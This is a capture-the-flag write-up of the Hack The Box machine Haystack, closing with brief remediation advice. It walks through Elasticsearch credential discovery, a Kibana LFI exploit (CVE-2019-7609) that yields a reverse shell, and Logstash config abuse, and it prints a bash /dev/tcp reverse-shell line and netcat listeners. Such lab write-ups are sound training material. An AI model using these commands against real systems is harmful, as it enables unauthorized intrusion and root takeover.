# Haystack

```
kali@kali:~/htb/Haystack$ sudo nmap -p- -sV -sC 10.129.110.54 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 02:58 EST
Nmap scan report for 10.129.110.54
Host is up (0.030s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.91 seconds
```

The default web-server only has an image of a needle in a haystack. I start a wfuzz search while I check the other clues.


The 9200 port reveals this information:
```
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
```



I download the image on the normal webserver and run strings through it:


```kali@kali:~/htb/Haystack$ strings -n 5 needle.jpg 
paint.net 4.1.1
UNICODE
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
O9 x?
-mO4r
c;jVm
        8I5K
|qouf

[...]
[...]
[...]

*Oo!;.o|?>
.n2FrZ
rrNMz
#=pMr
I$f2/<-iy
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
kali@kali:~/htb/Haystack$ echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" | base64 -d ; echo
la aguja en el pajar es "clave"
kali@kali:~/htb/Haystack$ 
```

This translates from spanish to: `the needle in the haystack is "key"`

I tried to steghide the file with "clave", "key", "aguja", and "needle" and other variations from that sentence.

I did not know of Elasticsearch before this. from https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch:

```
An Elasticsearch index is a collection of documents that are related to each other. 
Elasticsearch stores data as JSON documents. Each document correlates a set of keys (names of fields or properties) 
with their corresponding values (strings, numbers, Booleans, dates, arrays of values, geolocations, or other types of data).
```

I reccommend this link: https://towardsdatascience.com/an-overview-on-elasticsearch-and-its-usage-e26df1d1d24a?gi=64d60f23127f to learn more


I find all the created indices here:

`http://10.129.110.54:9200/_cat/indices?v`

?v means verbose, and let's me see what each of the columns are:

```
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```

So we can see quotes and bank are created indices.


I go to:

`http://10.129.110.54:9200/bank/_search?pretty=true&size=1000`

size just means that we display 1000 results. 10 is the default.

There is a lot of names here. The quotes index is full of spanish quotes.

In the quote results, I search for "login", "user", and "password", but find nothing.

But when I search "clave" I find "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="

`"This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk="`

```
kali@kali:~/htb/Haystack$ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d ; echo
pass: spanish.is.key
```

And the other match for clave= "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "

`"I have to save the password for the machine: dXNlcjogc2VjdXJpdHkg" `


``` 
kali@kali:~/htb/Haystack$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d ; echo
user: security 
```

So I SSH in:

```
kali@kali:~/htb/Haystack$ sudo ssh security@10.129.110.54
The authenticity of host '10.129.110.54 (10.129.110.54)' can't be established.
ECDSA key fingerprint is SHA256:ihn2fPA4jrn1hytN0y9Z3vKpIKuL4YYe3yuESD76JeA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.110.54' (ECDSA) to the list of known hosts.
security@10.129.110.54's password: 
X11 forwarding request failed on channel 0
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$ whoami
security
[security@haystack ~]$ id
uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[security@haystack ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for security: 
Sorry, user security may not run sudo on haystack.
[security@haystack ~]$ 

```

In the /tmp/ directory, I find two interesting folders. hsperfdata_root, containing a file called 5864.

And a directory called jruby-5864 containing two .jar files.

I google and find that they are part of the java performace counter.

I try running a procmon script:


```
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|ps|command"
	old_process=$new_process
done
```

To see if anything interesting is happening, but nothing really pops up.

There is no wget or smb on the machine, but I can upload via ssh.

```
kali@kali:~/htb/Haystack$ sudo scp linpeas.sh security@10.129.110.54:/home/security
security@10.129.110.54's password: 
linpeas.sh                                                                                                                100%  291KB 596.6KB/s   00:00    
kali@kali:~/htb/Haystack$
```


In the linpeas I find the kibana server:

```
[+] Searching Kibana yaml
/etc/kibana/kibana.yml                                                                             
server.port: 5601
server.host: "127.0.0.1"
elasticsearch.url: "http://localhost:9200"
```

Also a SGID folder:

```
[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                      
-r-xr-sr-x. 1 root tty       15K Jun  9  2014 /usr/bin/wall 
```

I also upload pspy, and find that logstash is ran as root:

```
2021/03/08 09:17:17 CMD: UID=0    PID=5864   | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash   
```

But I do not have read access on the configuration files. Kibana does though.

```
[security@haystack conf.d]$ ls -la
total 12
drwxrwxr-x. 2 root kibana  62 Jun 24  2019 .
drwxr-xr-x. 3 root root   183 Jun 18  2019 ..
-rw-r-----. 1 root kibana 131 Jun 20  2019 filter.conf
-rw-r-----. 1 root kibana 186 Jun 24  2019 input.conf
-rw-r-----. 1 root kibana 109 Jun 24  2019 output.conf
[security@haystack conf.d]$ 

```


I searchsploit kibana:

```
kali@kali:~/htb/Haystack$ searchsploit kibana
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Kibana 6.6.1 - CSV Injection                                                                                              | windows/webapps/47971.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

And there is an exploit. But a CSV injection won't give us a reverse shell on the Kibana user.

Googling "Kibana exploit" results in a RCE on Kibana < 6.60. And a script at https://github.com/LandGrey/CVE-2019-7609/

So I'm gonna port forward port 5601 so I can access kibana, and check the version.

`kali@kali:~/htb/Haystack$ ssh -L 5601:127.0.0.1:5601 security@10.129.110.54`

And then I go to `http://localhost:5601`

By going to the management tab on kibana, I see we are running Version: 6.4.2

So The exploit should be good.

```
kali@kali:~/htb/Haystack$ python CVE-2019-7609-kibana-rce.py -u http://localhost:5601 -host 10.10.14.13 -port 1337 --shell
[+] http://localhost:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[-] cannot reverse shell
```

Hmm. I try another vcersion I found at https://github.com/mpgn/CVE-2019-7609 

This led me to https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html

And after I did all the steps, and nothing happened. I realized that I could just use the LFI vulnerability since I have ssh access.

I did have to reset the box, as it would just hang if I tried to curl the reverse shell file.


```
kali@kali:~/htb/Haystack$ curl "http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../tmp/rev.js"
```

And on the listener:

```
kali@kali:~/htb/Haystack$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.110.90 60756
whoami
kibana
```

I improve the shell with `python -c 'import pty; pty.spawn("/bin/sh")'` and so on.

So now we can finally use kibana:

```
bash-4.2$ cat filter.conf
cat filter.conf
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
bash-4.2$ cat input.conf
cat input.conf
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
bash-4.2$ cat output.conf
cat output.conf
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
bash-4.2$ 

```

So it looks like all files named logstash_* in the /opt/kibana/ directory with the text "Ejecutar comando : %command" will be executed every 10 seconds.

```
bash-4.2$ pwd
pwd
/opt/kibana
bash-4.2$ echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.13/1338 0>&1" > logstash_1
bash-4.2$ cat logstash_1
cat logstash_1
Ejecutar comando : bash -i >& /dev/tcp/10.10.14.13/1338 0>&1
bash-4.2$ 
```

And on our listener:

```
kali@kali:~/htb/Haystack$ sudo nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.110.90 53802
bash: no hay control de trabajos en este shell
[root@haystack /]# whoami
whoami
root
[root@haystack /]#
```

## Comparing myself to the official writeup:

The combination of Elasticsearch, Logstash, and Kibana is called an ELK stack.

They go straight to the Elasticsearch server and find the indices, and they use curl -s and jq to filter the results.

They find the encoded messages by manually searching.

They find the open ports of the machine with `ss -4 -l -n`

They port forward port 5601 and find the Kibana LFI exploit.

They find the logstash conf files and create the reverse shell command to get root.

I also saw some other writeups that actually created other files and pointed to them with the logstash_* file instead of writing the command in the file itself.



## How to stop this exploit:

This was a bit more of a CTF, but a couple interesting things.

Obviously encoding usernames and passwords with base64 is not sufficient obfuscation of credentials.

Then, the Kibana version should be updated, so exploits are patched.

I'm unsure of how the inner workings of the ELK stack work. But if possible, the kibana user should not have access to the logstash conf files. Or the logstash cronjob should not be ran as root.


